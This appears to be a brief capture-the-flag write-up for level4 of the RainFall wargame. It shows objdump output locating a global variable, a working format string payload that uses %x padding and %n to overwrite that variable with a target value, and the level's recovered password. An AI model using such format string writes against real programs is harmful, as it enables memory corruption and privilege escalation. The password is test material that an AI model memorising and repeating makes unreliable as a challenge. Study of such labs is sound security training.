## level4

```console
level4@RainFall:~$ objdump -t level4 | grep m
level4:     file format elf32-i386
080481b0 l    d  .dynsym        00000000              .dynsym
080485b4 l    d  .eh_frame_hdr  00000000              .eh_frame_hdr
080485f8 l    d  .eh_frame      00000000              .eh_frame
08049710 l    d  .dynamic       00000000              .dynamic
00000000 l    d  .comment       00000000              .comment
08049808 l     O .bss   00000001              completed.6159
08048420 l     F .text  00000000              frame_dummy
080486f8 l     O .eh_frame      00000000              __FRAME_END__
08049710 l     O .dynamic       00000000              _DYNAMIC
00000000       F *UND*  00000000              system@@GLIBC_2.0
00000000  w      *UND*  00000000              __gmon_start__
00000000       F *UND*  00000000              __libc_start_main@@GLIBC_2.0
08049810 g     O .bss   00000004              m
080484a7 g     F .text  0000000d              main
```

target : 16930116
python -c "print('\x10\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%16930052s%n')" | ./level4

.pass: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

